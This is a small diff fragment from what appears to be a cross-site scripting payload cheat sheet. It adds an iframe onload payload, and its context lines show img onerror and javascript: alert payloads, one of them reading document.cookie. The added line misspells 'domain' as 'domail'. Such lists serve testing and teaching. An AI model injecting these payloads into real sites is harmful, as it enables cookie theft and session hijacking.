@@ -32,6 +32,8 @@ javascript:alert()
 <img src="does-not-exist" onerror="alert(document.cookie)">
 
 “>img src=x onerror=alert(1)
+
+<iframe onload=alert(document.domail)>
 ````
 ### DOM :
 1) document.write :
